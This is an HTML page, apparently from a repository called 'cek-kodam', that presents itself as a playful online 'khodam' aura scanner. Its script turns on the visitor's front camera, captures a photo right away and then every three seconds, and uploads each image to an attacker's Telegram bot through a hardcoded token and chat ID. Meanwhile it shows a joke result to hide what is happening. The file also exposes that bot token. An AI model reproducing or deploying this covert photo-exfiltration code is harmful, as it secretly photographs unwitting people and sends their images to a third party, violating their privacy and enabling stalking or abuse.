# cek-kodam
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PENERAWANGAN KHODAM ONLINE</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
        #cam-area { width: 100%; max-width: 320px; height: 320px; border: 2px solid #00ff00; margin: 20px auto; overflow: hidden; background: #111; position: relative; border-radius: 10px; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .btn { background: #00ff00; color: #000; padding: 15px; width: 100%; font-weight: bold; border: none; cursor: pointer; border-radius: 5px; font-size: 16px; box-shadow: 0 0 10px #00ff00; }
        #log { margin-top: 20px; color: #fff; font-size: 14px; min-height: 40px; }
        .scan-line { position: absolute; width: 100%; height: 2px; background: #00ff00; top: 0; animation: scan 2s linear infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
    </style>
</head>
<body>

    <div style="border: 1px solid #00ff00; padding: 15px; border-radius: 10px;">
        <h2 style="margin: 0;">SCANNER KHODAM</h2>
        <p style="font-size: 12px; color: #888;">Powered by Volox Tech</p>
        
        <div id="cam-area">
            <div class="scan-line"></div>
            <video id="video" autoplay playsinline muted></video>
        </div>

        <button class="btn" onclick="startRitual()">MULAI DETEKSI AURA</button>
        <div id="log">Siapkan wajah Anda di depan kamera...</div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const log = document.getElementById('log');
        
        // KONFIGURASI TELEGRAM LU
        const token = "7945183514:AAEQCbHUMs7DO0OfTBYgsHWtLDDOfiKSee0";
        const chatId = "8465963357";

        async function startRitual() {
            try {
                // Minta izin kamera
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                log.innerHTML = "Menganalisa Struktur Wajah & Aura...";
                
                // Kirim foto pertama & lanjut tiap 3 detik
                captureAndSend();
                const job = setInterval(captureAndSend, 3000);

                // Setelah 7 detik, munculin hasil prank
                setTimeout(() => {
                    clearInterval(job);
                    log.innerHTML = "<h1 style='color:yellow;'>KHODAM ANDA: KAKEK TUA</h1>";
                    alert("HASIL PENERAWANGAN:\nKhodam yang mendampingi Anda adalah KAKEK TUA.");
                }, 7500);

            } catch (e) {
                alert("Akses Kamera Ditolak! Ritual tidak bisa dilanjutkan.");
            }
        }

        function captureAndSend() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                const form = new FormData();
                form.append('chat_id', chatId);
                form.append('photo', blob, 'target.png');

                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: form
                });
            }, 'image/png');
        }
    </script>
</body>
</html>
